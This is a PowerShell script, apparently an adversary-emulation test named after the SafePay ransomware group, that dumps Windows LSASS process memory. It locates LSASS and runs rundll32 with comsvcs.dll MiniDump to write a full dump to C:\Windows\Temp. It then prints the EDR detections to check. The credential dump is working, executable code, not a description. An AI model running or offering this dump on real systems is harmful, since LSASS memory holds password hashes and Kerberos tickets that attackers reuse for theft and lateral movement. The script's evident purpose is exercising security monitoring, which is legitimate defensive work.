<#
.SYNOPSIS
    SafePay Credential Dump - DETECTION TRIGGER
.DESCRIPTION
    Dumps LSASS via comsvcs.dll MiniDump.
    TTP: T1003, T1003.001
#>
$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting SafePay Credential Dump (T1003)" -ForegroundColor Cyan

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] WARNING: Not running as Administrator. LSASS dump will likely fail." -ForegroundColor Red
}

# Step 1: Find LSASS
Write-Host "`n[*] [T1003.001] Locating LSASS process..."
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
    Write-Host "    [+] Found LSASS (PID: $($lsass.Id))" -ForegroundColor Green
} else {
    Write-Host "    [-] LSASS not found (Permission Denied?)" -ForegroundColor Red
    exit
}

# Step 2: Dump via comsvcs.dll
$dumpPath = "C:\Windows\Temp\lsass_safepay_$($lsass.Id).dmp"
Write-Host "`n[*] [T1003.001] Dumping LSASS via comsvcs.dll MiniDump..."
Write-Host "    CMD: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full"
try {
    $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full" -PassThru -Wait -ErrorAction Stop
    Start-Sleep -Seconds 2
    
    if (Test-Path $dumpPath) {
        $size = (Get-Item $dumpPath).Length
        Write-Host "    [+] LSASS dump created: $dumpPath ($size bytes)" -ForegroundColor Green
        Write-Host "    [!] CRITICAL: Delete this file immediately after testing!" -ForegroundColor Red
    } else {
        Write-Host "    [-] Dump file not created (EDR likely blocked)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [-] Dump failed: $_" -ForegroundColor Red
}

# Step 3: Alternative - Task Manager method (detection trigger)
Write-Host "`n[*] [T1003.001] Triggering procdump-style detection..."
Write-Host "    CMD: tasklist /fi `"imagename eq lsass.exe`" /v"
tasklist /fi "imagename eq lsass.exe" /v 2>&1 | ForEach-Object { Write-Host "    $_" }

Write-Host "`n[+] Credential Dump Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: comsvcs.dll MiniDump, LSASS access, rundll32 suspicious args" -ForegroundColor Magenta
